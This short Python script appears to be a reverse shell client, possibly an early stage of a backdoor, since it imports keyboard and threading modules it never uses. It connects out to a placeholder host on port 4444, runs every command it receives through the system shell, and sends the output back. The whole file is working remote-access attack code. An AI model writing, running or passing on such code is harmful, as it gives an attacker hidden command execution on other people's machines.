import socket
import subprocess
import os
import keyboard as k
from threading import Thread as thrd

host = '000.000.000.000'
port = 4444
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

while True:
    cmd = s.recv(1024)
    cmd = cmd.decode()

    cmd_process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    cmd_process = cmd_process.stdout + cmd_process.stderr
    s.send(cmd_process)
    
